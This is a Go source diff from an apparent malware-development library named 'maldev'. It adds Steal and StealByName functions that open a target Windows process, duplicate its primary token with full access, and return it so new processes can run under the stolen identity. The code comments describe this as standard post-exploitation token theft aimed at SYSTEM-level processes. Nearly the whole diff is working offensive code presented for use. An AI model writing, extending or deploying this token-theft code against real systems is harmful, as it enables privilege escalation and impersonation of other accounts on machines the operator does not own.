@@ -13,6 +13,7 @@ import (
 
 	"golang.org/x/sys/windows"
 
+	"github.com/oioio-space/maldev/process/enum"
 	"github.com/oioio-space/maldev/win/api"
 )
 
@@ -95,6 +96,49 @@ const (
 // manipulation methods.
 func New(t windows.Token, typ Type) *Token {
 	return &Token{token: t, typ: typ}
+}
+
+// Steal duplicates the primary token from a target process.
+// This is the standard post-exploitation token theft: open the process,
+// query its token, duplicate it as a primary token.
+//
+// Requires SeDebugPrivilege for SYSTEM-level processes.
+//
+// Example:
+//
+//	tok, err := token.Steal(targetPID)
+//	defer tok.Close()
+//	// Use tok to create processes as the stolen identity
+func Steal(pid int) (*Token, error) {
+	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
+	if err != nil {
+		return nil, fmt.Errorf("OpenProcess %d: %w", pid, err)
+	}
+	defer windows.CloseHandle(hProcess)
+
+	var hToken windows.Token
+	if err := windows.OpenProcessToken(hProcess, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &hToken); err != nil {
+		return nil, fmt.Errorf("OpenProcessToken: %w", err)
+	}
+
+	var dupToken windows.Token
+	err = windows.DuplicateTokenEx(hToken, windows.TOKEN_ALL_ACCESS,
+		nil, windows.SecurityImpersonation, windows.TokenPrimary, &dupToken)
+	hToken.Close()
+	if err != nil {
+		return nil, fmt.Errorf("DuplicateTokenEx: %w", err)
+	}
+
+	return New(dupToken, Primary), nil
+}
+
+// StealByName finds a process by name and steals its token.
+func StealByName(processName string) (*Token, error) {
+	procs, err := enum.FindByName(processName)
+	if err != nil || len(procs) == 0 {
+		return nil, fmt.Errorf("process %q not found", processName)
+	}
+	return Steal(int(procs[0].PID))
 }
 
 // Token returns the underlying windows.Token.
